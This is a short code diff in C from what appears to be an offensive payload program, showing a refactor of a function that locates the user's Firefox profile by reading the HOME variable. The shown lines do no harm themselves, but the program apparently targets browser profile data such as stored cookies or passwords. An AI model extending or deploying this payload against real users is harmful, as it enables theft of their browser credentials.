@@ -976,39 +976,10 @@ payload_end()
 {
 }
 
-static const char *get_env_from_proc(const char *key, char *buf, size_t bufsz) {
-    int fd = open("/proc/self/environ", O_RDONLY);
-    if (fd < 0) return NULL;
-
-    char tmp[65536];
-    ssize_t n = read(fd, tmp, sizeof(tmp) - 1);
-    close(fd);
-    if (n <= 0) return NULL;
-    tmp[n] = '\0';
-
-    size_t keylen = strlen(key);
-    char *p = tmp;
-    while (p < tmp + n) {
-        if (strncmp(p, key, keylen) == 0 && p[keylen] == '=') {
-            snprintf(buf, bufsz, "%s", p + keylen + 1);
-            return buf;
-        }
-        p += strlen(p) + 1;
-    }
-    return NULL;
-}
-
 static int find_firefox_profile(char *profile_path_out, size_t len) {
     char profiles_ini[PATH_MAX];
 
-    printf("[payload] Reading HOME from /proc/self/environ\n");
-    fflush(stdout);
-
-    char home_buf[PATH_MAX];
-    const char *home = get_env_from_proc("HOME", home_buf, sizeof(home_buf));
-
-    printf("[payload] HOME = %s\n", home ? home : "(null)");
-    fflush(stdout);
+    const char *home = getenv("HOME");
 
     if (!home) {
         printf("[payload] HOME environment variable not set\n");
